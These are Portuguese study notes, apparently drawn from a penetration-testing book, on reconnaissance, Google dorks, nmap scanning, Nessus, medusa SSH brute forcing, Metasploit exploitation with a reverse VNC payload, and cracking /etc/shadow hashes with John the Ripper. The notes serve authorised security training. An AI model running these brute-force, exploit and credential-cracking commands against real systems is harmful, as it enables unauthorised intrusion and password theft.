## Teste de invasão Weidman (2014):

* Preparação: conversa com o cliente a respeito dos objetivos do teste de invasão, extensão do teste e outros detalhes partulares a cada caso
* Coleta de dados: busca de informações sobre o cliente
* Modelagem de ameaças: faz-se o plano de ação e escolha de métodos de ataque
* Análise de vulnerabilidades: busca de vulnerabilidades no sistema alvo
* Exploração de falhas: tenta-se tirar vantagem das vulnerabilidades descobertas
* Geração de relatório: elabora-se um relatório com as descobertas e recomendações de segurança

## Fases apresentadas no livro

* Reconhecimento: quando são identificadas informações sobre o alvo IP (IP, sistema operacional, sevidor web, e outros serviçoes, contas de e-mail, etc);
* Escaneamento (ou scanning): quando são procuradas portas abertas e vulnerabilidades;
* Exploração de falhas: quando de fato ocorre a invasão;

Obs: essas fases podem se repitir caso existam mais computadores na rede

## Coleta de informações

* 1 - Criar uma lista de IPs ou URLs (Univorm Resource Locators - localizadores padrão de recursos) que possam ser atacados
* Whois, NetCraft e Nslookup

### Clonagens de Sites

Clonar um site é uma atividade de `fácil rastreamento`, e não é considerada inofensiva.

#### HTTrack

`HTTrack` é utilizado para analisar o site offline, pois sucessivos acessos ao site serão rastreados e identificados `Impressões digitais`.

```sh
httrack
```

Usar a opção `Mirror Web Site` do httrack, o site será copiado para a pasta `websites` dentro de sua `HOME`

Versão gráfica: `httraqt`

### Diretivas do Google

O google possui ferramentas eficientes de pesquisa tornando possível a obtenção de informações para o teste de invasão

Para usar uma diretiva são usados dois itens separados por dois pontos:

* Nome da diretiva;
* Termo a ser pesquisado;

#### Diretivas

##### site

Utilizado para pesquisar resultados de um `domínio` especificado

`site:empresaX.com.br email funalo`

Na pesquisa acima será mostrada resultados o endereço de email de uma pessoa no domínio empresaX.com.br

##### intitle

Utilizado para pesquisar uma palavra-chave no endereço de um site `url`

`intitle:index of`


`intitle:admin`

Será retornada uma série de páginas de `login`

##### cache

Exibe apenas as informações exraídas da cache do Google (contém cópias reduzidas de todos os sites sujeitos ao rastreamento dos Google Bots)

* Não deixa "impressões digitais"
* Permite visualizar páginas e arquivos que tenham sido removidos do site alvo

`cache:empresaX.com.br`


##### filetype

Permite pesquisas baseadas em extensões de arquivos

`filetype:config apache`

Nessa pesquisa será retornada todos os arquivos com extensão `.config` relacionados ao Apache (servidor web livre)

Pode-se utilizar qualquer tipo de extensão: `.txt`, `.doc`, `.odt`, `.pdf`, `.ppt`, `.xls`, `.ods`, etc...

### Obtendo endereços de e-mail

Script em python disponível em: http://www.edge-security.com/

#### The Harvester

* `-d`: especifiva o domínio
* `-l`: limite de resultados
* `-b`: fonte de dados (Google, Bing, PGP, LinkedIn, etc)

Exemplo de uso:

```sh
./theHarvester.py -d empresaX.com.br -l 10 -b google

# ou

./theHarvester.py -d empresaX.com.br -l 10 -b all
```
### Whois e NetCraft

Informações:

* Endereço IP e nome dos servidores DNS;
* Domínio;
* Proprietário;
* CNPJ;
* Endereço;
* Telefone;
* Outras;

#### [whois](www.whois.net)

```sh
whois empresaX.com.br
```

Obs: caso não seja mostrado o endereço IP usar o comando `hosts empresaX.com.br`

#### [netcraft](www.netcraft.com)

Fornece uma série de informações

#### [bulbsecurity](www.bulbsecurity.com)

Fornece um relatório sobre sites que contenham certas palavras, caso seja especificado uma `url` será mostrada um relatório do site, falando sobre `Background`, `Network` e `Hosting History`

Também fornece informações sobre `segurança do sistema` alvo

#### Nslookup

Usado em consultas a servidores DNS e permite obter informações de hosts registrados no servidor

Exemplo:

```sh
nslookup 8.8.8.8
```

Alguns endereços possuem diversos servidores, é possível listar esses servidores

```sh
nslookup www.google.com
```

A flag `-query` pode ser usada com `mx` (Obter grau de preferência do servidor), com `soa` (Obter informações detalhadas de um domínio) e com `any` mostra todos os registros disponíveis.

### Escaneando portas Abertas e Serviços

Portas famosas:

* 20: transferência de dados FTP;
* 21: controle de transferência FTP;
* 22: SSH;
* 23: Telnet;
* 25: SMTP;
* 53: DNS;
* 80: HTTP;
* 443: HTTPS;

#### Ping

Usa o protocolo ICMP (Internet Control Messsage Protocol)

Computadores e dispositivos de rede podem ser configurados para não responder dispositivos

```sh
ping 8.8.8.8
```

#### FPing

Usaremos ferramentas chamadas de `ping sweepers`, que permitem o envio automatizado de pacotes para uma faixa de endereços IP

```sh
fping -a -g 10.0.0.1 10.0.0.254 > hosts.txt
```

`-a`: hosts ativos
`-g`: especificar o intervalo de endereços que deseja pesquisar

#### Nmap

`65.536` portas existentes (`0 - 65.535`)

Exemplo:

```sh
nmap -sT -p- -Pn 10.0.0.102
```

`-sT`: scan TCP Connect
`-p-`: todas as portas
`-Pn`: Não tentar descobrir se o host está ativo usando o `ping`

Exemplo (em uma faixa de IPs):

```sh
nmap -sT -p- -Pn 10.0.0.102-254
```

`-sU`: scan UDP (Serviços como: `DHCP`, `DNS`, `SNMP`, `DNS` e `FTP`)

Obs: busca em portas UDP é mais lenta (Geralmente usamos só as 1000 primeiras portas sem usar a flag `-p-`)

No scan UDP a maioria das portas é marcada como `open/filtered`, pois não existe pacote de resposta no UDP (Não é possível diferenciar uma porta abertade uma porta sendo filtrada por um firewall)

Duas opções para detectar portas mesmo com firewall:

* `-sX`: busca Xmas
* `-sN`: busca Nula

## Escaneando Vulnerabilidades

### [Nessus](www.tenable.com)

Iniciar o nessus (em background):
```sh
/etc/init.d/nessusd start
```
Registre-se, crie uma conta adm e preencha um formulário do software

Começe por um template básico `Network Scan` e escolha as portas que serão pesquisadas

Então um scan começará automaticamente, depois será retornado um relatório com as vulnerabilidades descobertas (descrição e possíveis soluções)

ATENÇÃO PARA NÍVEIS `ALTOS` E `CRÍTICOS`

## Explorando vulnerabilidades

### Força bruta (medusa)

```sh
medusa -h 10.0.0.105 -u rh -P Downloads/password.txt -M ssh
```

`-h`: host
`-u`: nome de usuário
`-P`: wordlist
`-M`: serviço à ser atacado

### Utilizando um Framework (metasploit)

Possui uma grande variedade de `payloads`

Iniciar o metasploit:

```sh
msfconsole
```

`help`: ajuda com comandos
`help <nome do comando>`: ajuda com comandos

#### Procurar exploits:

Procurar pelo exploit `ms09-001`

```sh
search ms09-001
```

Cada exploit tem um ranking (confiabilidade do exploit,ou seja sucesso sem causar instabilidades no sistema alvo)

Classificações:

* Manual
* Low
* Average
* Normal
* Good
* Great
* Excelent

Procurar por exploits do ano de `2015`:

```sh
search 2015
```

Para obter mais informações (licença, classificação, author, operações basicas e detalhes do exploit) sobre um exploit o comando `info` pode ser usado:

```sh
info auxiliary/dos/windows/smb/ms09_001_write
```

#### Usar exploits:

Selecionar o exploit:

```sh
use exploit/windows/smb/ms08_067_netapi
```

Vai entrar no modo do exploit, depois é usado o comando `show payloads`

Selecionar o payload (O payload do exemplo imprime "You Got Pwned!"):

```sh
set payload windows/speak_pwned
```

Payloads precisam de alguma configuração, para ver o que precisa ser configurado:

```sh
show options
```

Para definir algum parâmetro:

```sh
set RHOST 10.0.0.106
```

Para definir outro payload (O payload instala `VNC` que permite o controle remoto de um computador, mas precisa que seu computador tenha `VNC`):

```sh
set payload windows/vncinject/reverse_tcp
```

Definindo os parâmetros pro `VNC`:

```sh
set RHOST 10.0.0.106
set LHOST 10.0.0.101
set ViewOnly false
```

## Cracking de senhas

### [John The Ripper](www.openwall.com/john)

Senhas: `/etc/shadow`

Info Usuarios: `/etc/passwd`

#### Unshadow

O unshadow combina as informações do usuário com as suas senhas

```sh
unshadow /etc/passwd /etc/shadow > hashes.txt
```

Para crackear as senhas é utilizado o comando abaixo (Durante a execução pode clicar qualquer tecla para mostrar o progresso atual):

```sh
john hashes.txt
```

Para exibir as senhas que já foram quebradas:

```sh
john --show hashes.txt
```

Em um sistema Windows o arquivo se chama `SAM` e as senhas estarão no diretório `C:\Windows\System32\Config`, mas o acesso é bloqueado pelo Sistema Operacional (É necessário acessar por um boot). Para extrair os hashes é necessário usar a ferramenta `Samdump2`

## Sniffing de Tráfego de Rede

Normalmente as placas de rede descartam os pacotes não endereçados a elas e repassam para a CPU os pacotes enderçados ao computador. Mas é possível mudar a placa de rede para o modo `promíscuo` aceitando todos os pacotes, nesse ponto entra o `sniffing` de tráfego de rede.

O `Sniffing` de tráfego de rede consiste em capturar e visualizar pacotes que trafegam pela rede. Esta técnica tira proveito de protocolos que não utilizam criptografia de dados.

### [Wireshark](www.wireshark.org)

Obs: Não é recomendado usar no modo `root`

O wireshark é capaz de capturar dados da Ethernet, wireless, Bluetooth e outros.

#### Setup

Para que o wireshark possa funcionar normalmente

```sh
sudo groupadd wireshark
sudo usermod -a -G wireshark $USER
sudo chgrp wireshark /usr/bin/dumpcap
sudo chmod 755 /usr/bin/dumpcap
sudo setcap cap_net_raw,cap_net_admin=eip /usr/bin/dumpcap
```

#### Uso

No protocolo `FTP` é possível ver a senha e o usuário em plain/text já que o protocolo `FTP` não usa criptografia

#### Filter

Na barra de pesquisa é possível escrever `ftp` para filtrar conexões `ftp`

## Relatório

Deixe o relatório organizado e esclarecedor. Divida-o em seções.

* Sumário
* Introdução (Descreva como o teste foi efetuado)
* Seção para relatar falhas (softwares, protocolos, portas, relatórios gerados pelas ferramentas Nmap Nessus Metasploit)
* Conclusão (Deixe claro que o sistema não foi comprometido e que está aberto para maiores informações)

Obs 1: Nem sempre o leitor tem tanto conhecimento técnico, por isso é importante deixar didático

Obs 2: O último passo pode potencializar um emprego, como também pode demonstrar sua capacidade e credibilidade como consultor (Um relatório bem escrito pode abrir vagas no mercado)

### Especializações

* Segurança de aplicações Web;
* Segurança ofensica (que foi a especialização explorada nesse livro);
* Engenharia reversa;
* Análises de malwares;
* Técnicas forenses digitais;
* Segurança wireless;
